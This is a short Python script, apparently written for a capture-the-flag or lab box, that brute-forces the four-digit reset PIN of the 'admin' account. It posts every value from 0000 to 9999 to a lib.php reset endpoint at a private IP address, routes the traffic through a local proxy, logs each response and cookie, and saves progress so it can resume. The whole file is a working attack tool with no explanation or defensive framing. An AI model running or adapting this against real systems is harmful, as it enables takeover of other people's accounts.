import requests
import random
import json

#with open("status.txt", 'w') as write_file:
#   l=list(range(0,9999))
#   json.dump(l, write_file)

proxies = {"http":"http://localhost:8080", "https":"http://localhost:8080"}
with open("status.txt", 'r') as read_file:
   l=json.load(read_file)

session=requests.Session()
session.proxies.update(proxies)

print(l)
while l:
  l_len=len(l)
  pos=random.randrange(0,l_len)

  value="{:0>4}".format(int(l[pos]))

  url="http://10.129.95.167/lib.php"
  s=requests.post(url, data={"action":"reset",
                             "username":"admin",
                             "pin":""})
  print(s.content)
  r=session.post(url, data={"action":"reset",
                             "username":"admin",
                             "pin":value})
  cookie="unset"
  if "Set-Cookie" in r.headers:
      cookie=r.headers["Set-Cookie"]
  string="rnd:{:0>4} val:{}:{} - {} _ {}".format(pos,value,r.status_code,r.content.decode('utf-8'), cookie)
  print(string)

  with open("outcome.txt", 'a') as out:
     out.write(string)
     out.write("\n")
    
  l.remove(int(value))

  with open("status.txt", 'w') as rewrite:
     json.dump(l, rewrite)

  
